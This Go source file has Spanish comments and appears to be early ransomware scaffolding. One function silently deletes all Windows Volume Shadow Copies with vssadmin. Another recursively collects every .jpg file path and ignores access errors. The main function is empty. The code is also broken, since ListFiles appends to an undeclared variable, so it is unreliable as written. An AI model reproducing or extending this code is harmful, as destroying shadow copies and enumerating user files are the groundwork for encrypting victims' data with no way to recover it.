package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

func DeleteAllShadowCopies() error {
	cmd := exec.Command("vssadmin", "delete", "shadows", "/all", "/quiet")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("error al borrar shadow copies: %w\nsalida: %s", err, string(output))
	}
	return nil
}

func ListFiles(root string) ([]string, error) {
	var files []string

	err := filepath.WalkDir(root, func(path string, d os.DirEntry, err error) error {
		if err != nil {
			// Si hay un error de acceso (p.ej. permisos), lo ignoramos y seguimos
			return nil
		}
		if !d.IsDir() && strings.HasSuffix(strings.ToLower(d.Name()), ".jpg") {
			jpgFiles = append(jpgFiles, path)
		}
		return nil
	})
	if err != nil {
		return nil, fmt.Errorf("error al recorrer el directorio: %w", err)
	}

	return jpgFiles, nil
}

func main() {

}
